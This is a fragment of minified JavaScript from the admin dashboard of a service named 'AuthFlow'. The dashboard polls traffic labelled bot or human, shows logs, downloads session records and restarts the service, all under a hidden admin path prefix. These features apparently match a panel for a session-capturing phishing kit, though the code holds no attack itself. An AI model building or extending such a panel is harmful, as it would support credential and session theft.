${v.is_bot?'badge-bot':'badge-human'}">${v.is_bot?'🤖 BOT':'👤 HUMAN'}</span></td></tr>`).join('');document.querySelector('#trafficTable tbody').innerHTML=html||'<tr><td colspan="4">No traffic</td></tr>';}catch(e){console.error(e)}}async function loadLogs(){try{const res=await fetch('/'+adminPrefix+'/logs?lines=100');const logs=await res.text();const container=document.getElementById('logContainer');container.innerHTML=logs.split('\n').map(l=>`<div class="log-line">${escapeHtml(l)}</div>`).join('');}catch(e){console.error(e)}}function downloadSession(id){window.open('/'+adminPrefix+`/download/${id}`,'_blank')}async function restartService(){if(confirm('Restart AuthFlow? Dashboard will reconnect.')){await fetch('/'+adminPrefix+'/restart',{method:'POST'});alert('Restarting...');setTimeout(()=>location.reload(),5000);}}async function runCleanup(){await fetch('/'+adminPrefix+'/cleanup',{method:'POST'});alert('Cleanup complete');loadDashboard();}function escapeHtml(str){if(!str)return '';return str.replace(/[&<>]/g,function(m){if(m==='&')return'&amp;';if(m==='<')return'&lt;';if(m==='>')return'&gt;';return m;})}function showRefresh(){const el=document.getElementById('refreshIndicator');el.style.opacity='1';setTimeout(()=>el.style.opacity='0',1000)}document.querySelectorAll('.menu-item').forEach(item=>{item.addEventListener('click',()=>{document.querySelectorAll('.menu-item').forEach(m=>m.classList.remove('active'));item.classList.add('active');activeTab=item.dataset.tab;document.getElementById('dashboardPanel').style.display=activeTab==='dashboard'?'block':'none';document.getElementById('sessionsPanel').style.display=activeTab==='sessions'?'block':'none';document.getElementById('trafficPanel').style.display=activeTab==='traffic'?'block':'none';document.getElementById('logsPanel').style.display=activeTab==='logs'?'block':'none';if(activeTab==='logs')loadLogs();})});setInterval(()=>{if(activeTab==='dashboard'){loadDashboard();loadSessions();loadTraffic();}else if(activeTab==='sessions')loadSessions();else if(activeTab==='traffic')loadTraffic();},3000);loadDashboard();loadSessions();loadTraffic();</script></body></html>`